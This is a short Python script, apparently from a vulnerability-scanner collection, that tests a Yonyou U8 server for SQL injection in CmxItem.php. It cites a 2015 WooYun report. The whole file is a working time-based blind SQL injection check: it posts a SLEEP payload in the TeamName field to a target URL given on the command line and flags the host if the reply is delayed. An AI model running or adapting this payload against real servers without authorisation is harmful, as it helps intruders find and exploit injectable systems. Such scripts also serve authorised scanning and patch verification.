#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友u8 CmxItem.php SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0152899
author: Lucifer
description: 文件/Server/CmxItem.php中,参数pgid存在SQL注入。
'''
import sys
import time
import json
import requests
import warnings
from termcolor import cprint

class yonyou_u8_CmxItem_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/Server/CmxItem.php?pgid=System_UpdateSave"
        vulnurl = self.url + payload
        post_data = {
            "TeamName":"test'AND(SELECT * FROM (SELECT SLEEP(6))usqH)%23"
        }
        start_time = time.time()
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                cprint("[+]存在用友u8 CmxItem.php SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = yonyou_u8_CmxItem_sqli_BaseVerify(sys.argv[1])
    testVuln.run()